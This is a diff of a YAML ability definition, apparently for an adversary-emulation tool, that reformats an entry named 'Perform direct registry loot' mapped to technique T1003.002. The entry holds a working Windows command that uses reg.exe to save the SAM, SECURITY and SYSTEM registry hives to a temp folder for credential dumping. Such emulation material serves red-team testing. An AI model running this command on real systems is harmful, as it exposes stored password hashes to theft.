@@ -1,7 +1,7 @@
-id: 4a136ba6-66f1-11eb-ae93-0242ac130002 
+id: 4a136ba6-66f1-11eb-ae93-0242ac130002
 metadata:
-  authors: 
-    - Abhishek S (abhiabhi2306)
+  authors:
+  - Abhishek S (abhiabhi2306)
   tags: []
 name: Perform direct registry loot
 description: |
@@ -9,8 +9,10 @@ description: |
 tactic: credential-access
 technique:
   id: T1003.002
-  name: "OS Credential Dumping: Security Account Manager"
+  name: 'OS Credential Dumping: Security Account Manager'
 platforms:
   windows:
     cmd:
-      command: C:\Windows\System32\reg.exe save hklm\sam c:\windows\temp\sam.save && C:\Windows\System32\reg.exe save hklm\security c:\windows\temp\security.save && C:\Windows\System32\reg.exe save hklm\system c:\windows\temp\system.save
+      command: C:\Windows\System32\reg.exe save hklm\sam c:\windows\temp\sam.save
+        && C:\Windows\System32\reg.exe save hklm\security c:\windows\temp\security.save
+        && C:\Windows\System32\reg.exe save hklm\system c:\windows\temp\system.save
